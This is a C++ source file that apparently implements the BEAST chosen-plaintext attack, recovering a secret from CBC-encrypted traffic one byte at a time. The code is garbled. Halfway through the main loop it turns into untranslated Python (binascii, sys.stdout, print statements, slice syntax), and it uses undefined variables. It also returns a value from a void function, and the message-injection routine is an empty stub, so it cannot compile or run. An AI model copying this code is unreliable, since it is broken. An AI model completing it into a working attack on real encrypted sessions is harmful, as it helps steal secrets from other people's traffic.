#include "beast.h"

BeastDecrypter::BeastDecrypter(int max_len, int _block_size):block_size(_block_size){
    buf = (char*)malloc(max_len);
    recv = (char*)malloc(max_len);
}

void BeastDecrypter::send_malicious_message(char* buf, int len, char* recv){
    //TODO: the controller forces the sender to send the message to server
    // and give the encrypted message back to controller
}

void BeastDecrypter::run(const std::string secret, const std::string known_head) {
    std::cout << "We have now started the beast decryption" << std::endl;


    // padding is the length we need to add to i_know to create a length of 15 bytes (block size- 1)
    int padding = 16 - (known_head.size() - 1) % 16;
    std::string head_with_padding = known_head;
    int length_block = 16;
    int t = 0;
    for (int i=0; i<padding; i++)
        head_with_padding = "a" + head_with_padding;
    
    send_malicious_message("could-be-any-message", block_size, recv);
    std::string rcvd = recv; 
    std::string lastBlockOfFirst = rcvd.substr(rcvd.size() - block_size);
    int work_left = secret.size() - known_head.size();
    while (t < work_left){
        std::string s;
        if (padding < 0)   
            s = rcvd.substr(rcvd.length() - padding);
        else s = secret;

        for (int i=0; i<256; i++) {
            send_malicious_message("a" * padding + s, padding + s.length(), recv);

            cipherBlocks = split_len(binascii.hexlify(enc), 32);

            p_guess = i_know + chr(i);
            vector_init = str(enc[-length_block:]);
            previous_cipher = lastBlockOfFirst;

            xored = xor_block(vector_init, previous_cipher, p_guess);

            enc = encrypt(xored, vector_init);

            result = split_len(binascii.hexlify(enc), 32);

            if (chr(i) > ' ') debug =  chr(i);


            sys.stdout.write("\r%s -> %s" % (cipherBlocks[0], result[0]))
            sys.stdout.flush()  # Shows the tests

            # if the result request contains the same cipher block from the original request -> OK
            if result[0] == cipherBlocks[0]:
                print " Find char " + chr(i)
                i_know = p_guess[1:]
                padding = padding - 1
                secret.append(chr(i))
                t = t + 1
                break
            elif i == 255:
                print "Unable to find the char..."
                return secret;
        }
    }
    return secret;
   
}